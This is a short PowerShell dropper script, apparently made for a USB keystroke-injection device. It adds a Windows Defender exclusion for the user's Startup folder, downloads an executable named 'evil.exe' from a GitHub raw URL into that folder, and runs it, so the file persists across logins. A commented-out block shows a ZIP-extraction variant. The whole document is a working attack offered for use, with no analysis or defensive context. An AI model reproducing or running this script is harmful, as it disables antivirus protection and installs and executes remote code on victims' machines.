Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"



$url = "https://github.com/knoxoxen/flipperstuffs/raw/main/evil.exe"
$destination = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe"
Invoke-WebRequest -Uri $url -OutFile $destination



#Extract the ZIP file:
#$zipPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.zip"
#$extractPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
#Expand-Archive -Path $zipPath -DestinationPath $extractPath -F

#Run the EXE file:
$exePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe"
Start-Process -FilePath $exePath